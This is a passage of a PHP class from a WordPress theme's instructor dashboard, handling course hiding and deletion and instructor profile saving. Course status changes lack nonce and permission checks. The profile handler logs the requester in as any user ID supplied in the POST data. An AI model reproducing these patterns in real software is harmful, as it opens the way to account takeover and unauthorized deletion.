                                        <button class="tutor-btn tutor-btn-primary tutor-list-ajax-action tutor-ml-20" data-request_data='{"course_id":<?php echo $post->ID; ?>,"action":"tutor_delete_dashboard_course"}' data-delete_element_id="<?php echo $row_id; ?>">
                                            <?php esc_html_e('Yes, Delete This', 'edumall-child'); ?>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
<?php
        endforeach;
        $output = ob_get_clean();
        return $output;
    }

    public function change_course_status()
    {
        $course_action = sanitize_text_field($_POST['courseAction']);
        $course_ID = sanitize_text_field($_POST['courseID']);

        switch ($course_action):
            case "hide-course":
                $update_status = array(
                    'post_type' => 'courses',
                    'ID' => $course_ID,
                    'post_status' => 'pending'
                );
                $statusTest = wp_update_post($update_status);
                wp_send_json(array('result' => 'دوره با موفقیت پنهان گردید'));
                break;
            case "delete-course":
                $delete = CourseModel::delete_course($course_ID);
                wp_send_json_success(['result' => "دوره با موفقیت حذف گردید", 'status' => 'delete']);
                break;
        endswitch;
    }

    public function save_instructor_metadata()
    {
        if (!isset($_POST['_instructor_nonce']) || !wp_verify_nonce($_POST['_instructor_nonce'], 'edit_instructor_nonce')) {
            wp_send_json_error('Invalid nonce');
        }

        $instructor_tags = !empty($_POST['instructor_tags']) ? array_map('sanitize_text_field', $_POST['instructor_tags']) : '';
        $instructor_username = sanitize_text_field($_POST['instructor_username']);
        $instructor_profession = sanitize_text_field($_POST['instructor_profession']);
        $instructor_story_text = sanitize_text_field($_POST['instructor_story']);
        $instructor_picture = sanitize_text_field($_POST['instructor_picture']);
        $instructor_apply = sanitize_text_field($_POST['become_instructor']);
        $instructor_id = !empty($_POST['user_id']) ? sanitize_text_field($_POST['user_id']) : get_current_user_id();


        if (!empty($instructor_username)) :
            update_user_meta($instructor_id, '_instructor_username', $instructor_username);
        endif;

        if (!empty($instructor_tags)) :
            update_user_meta($instructor_id, '_instructor_tags', $instructor_tags);
        endif;

        if (!empty($instructor_profession)) :
            update_user_meta($instructor_id, '_instructor_profession', $instructor_profession);
        endif;

        if (!empty($instructor_story_text)) :
            update_user_meta($instructor_id, '_instructor_story_text', $instructor_story_text);
        endif;

        update_user_meta($instructor_id, '_instructor_profile_pic', $instructor_picture);

        if (boolval($instructor_apply)) :
            // Get the user object
            $user = new WP_User($instructor_id);

            // enable user status
            update_user_meta($instructor_id, '_tutor_instructor_status', true);

            // Remove role
            $user->remove_role('subscriber');

            // Check if the user exists
            $user->add_role('tutor_instructor');

            wp_send_json(['result' => 'ثبت نام شما با موفقیت انجام شد', 'url' => site_url()]);

            exit;
        endif;

        if (!empty($_POST['user_id'])) {
            $user = get_user_by('id', $instructor_id);


            if ($user) {
                // Set the current user
                wp_set_current_user($instructor_id, $user->user_login);

                // Set authentication cookies
                wp_set_auth_cookie($instructor_id);

                // Redirect to the desired page after login
                wp_send_json(['result' => true]);
                exit;
            } else {
                // Handle the error if user does not exist
                wp_die('User does not exist.');
            }
        } else {
            wp_send_json(['result' => 'بروزرسانی پروفایل انجام شد']);
        }
    }
}

// Initialize the class
$instructorDashboard = new instructorDashboard();
